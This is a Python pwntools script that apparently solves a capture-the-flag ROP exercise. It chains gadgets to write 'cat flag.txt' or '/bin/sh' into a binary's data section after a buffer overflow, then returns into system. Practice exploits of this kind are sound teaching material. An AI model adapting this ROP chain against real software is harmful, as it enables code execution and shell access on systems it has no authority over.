from pwn import *

def putStringtoAddress32(address, string):
    while (len(string) % 4 != 0):
        string += '\x00'

    # pop edi; pop ebp; ret;
    pop2ret = p32(0x080486da)

    # mov dword ptr [edi], ebp; ret;
    mv = p32(0x08048670)

    res = ''
    for i in range(0, len(string), 4):
        res += pop2ret + p32(address + i) + string[i:i+4]
        res += mv
    return res

def putStringtoAddress64(address, string):
    while (len(string) % 8 != 0):
        string += '\x00'

    # pop r14; pop r15; ret;
    pop2ret = p64(0x0000000000400890)

    # mov qword ptr [r14], r15; ret;
    mv = p64(0x0000000000400820)

    res = ''
    for i in range(0, len(string), 8):
        res += pop2ret + p64(address + i) + string[i:i+8]
        res += mv
    return res

def solve32():
    # data section
    data = 0x0804a028
    # desire string
    string = 'cat flag.txt'

    # craft payload
    payload = 'a'*44 + putStringtoAddress32(data, string)

    # return to system call
    payload += p32(0x0804865a) + p32(data)

    return payload

def solve64():
    # data section
    data = 0x0000000000601050
    # desire string
    string = '/bin/sh'

    # ROP to put string to data segment
    payload = 'a'*40 + putStringtoAddress64(data, string)

    # ROP to put data segment to $rdi
    payload += p64(0x0000000000400893) + p64(data)

    # return to system call
    payload += p64(0x0000000000400810)

    return payload

# print solve32()
print solve64()
